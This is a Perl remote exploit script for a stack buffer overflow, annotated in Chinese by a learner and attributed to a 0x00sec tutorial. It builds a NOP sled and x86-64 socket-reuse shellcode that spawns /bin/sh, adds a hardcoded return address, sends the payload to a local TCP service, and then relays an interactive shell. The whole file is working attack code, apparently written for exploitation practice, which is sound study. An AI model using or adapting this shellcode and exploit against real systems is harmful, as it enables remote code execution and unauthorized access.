#!/usr/bin/perl
use IO::Select;
use IO::Socket::INET;
$|=1;

print "Remote Exploit";
print "Liuqiang learned from 0x00sec :)\n\n";

# You may need to calculate these magic numbers for your system
$addr = "\x90\xdc\xff\xff\xff\x7f\x00\x00";   #addr是攻击的溢出数组result的地址+272(110).
$off = 264;

# Generate the payload
$shellcode = "\x48\x31\xc0\x50\x50\x50\x5e\x5a\x50\x5f\xb0\x20\x0f\x05\x48\xff\xc8\x50\x5f\xb0\x21\x0f\x05\x48\xff\xc6\x48\x89\xf0\x3c\x02\x75\xf2\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x52\x5e\xb0\x3b\x0f\x05";

$nops = $off - length $shellcode;
$payload = "\x90" x $nops . $shellcode . $addr;

$plen = length $payload;
$slen = length $shellcode;
print "SLED $nops Shellcode: $slen Payload size: $plen\n";

# Connect
my $socket = new IO::Socket::INET (
    PeerHost => '127.0.0.1',
    PeerPort => '12345',
    Proto => 'tcp',
    );
# Set up select for asynchronous read from the server
$sel = IO::Select->new( $socket );  #创建新对象，使用socket初始化
$sel->add(\*STDIN); #对象中增加一个 stdin 句柄用于输入

# Exploit!
$socket->send ($payload);
$socket->recv ($trash,1024);
$timeout = .1;  #0.1   s为单位

$flag = 1; # Just to show a prompt

#https://perldoc.perl.org/IO/Select.html
#https://blog.csdn.net/weixin_33910137/article/details/92780845
# 使用select 使用户可以处理IO HANDLE
# 下面的程序，if (@ready = $sel->can_read ($timeout))，有IO，进入if，判断是socket还是增加的 $sel->add(\*STDIN)。else没有IO，输出一个prompt


# Interact!
while (1) {
    if (@ready = $sel->can_read ($timeout))  {#0.1s取一次，没有返回就跳到else显示提示符
	foreach $fh (@ready) { #foreach loop ready。$sel->can_read ($timeout) 返回一系列句柄。相当于数组读取，读到$fh。
	    $flag =1;
	    if($fh == $socket) { # 如果是
		$socket->recv ($resp, 1024);
		print $resp;
	    }
	    else { # It is stdin
		$line = <STDIN>;
		$socket->send ($line);
	    }
	}
    }	
    else { # Show the prompt whenever everything's been read
	print "0x00pf]>  " if ($flag);
	$flag = 0;
    }	
}
